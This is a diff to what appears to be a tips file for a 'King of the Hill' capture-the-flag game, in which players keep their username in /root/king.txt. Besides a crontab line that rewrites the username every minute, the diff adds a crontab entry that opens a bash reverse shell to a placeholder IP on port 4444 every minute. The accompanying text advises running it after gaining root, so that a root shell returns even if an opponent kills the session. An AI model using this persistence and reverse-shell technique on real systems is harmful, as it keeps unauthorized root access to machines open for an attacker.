@@ -36,7 +36,10 @@ while [[ $(cat /root/king.txt) != "[usernameHere]" ]]; do echo "[usernamehere]" 
 
 also u can add your username automatically by putting inside /etc/crontab
 
-`* * * * * echo "[usernameHere]" >> /root/king.txt >/dev/null 2>&1` 
+`* * * * * echo "[usernameHere]" >> /root/king.txt >/dev/null 2>&1`
+
+and below command can be used to get persistence on the system but run it after getting root access so every minute you can get shell as root in case of someone is trying to kill your terminal else if you do this without getting root you'll get shell as normal user not as root user
+`* * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/[IP_ADDR]/4444 0>&1"`
 
 
 
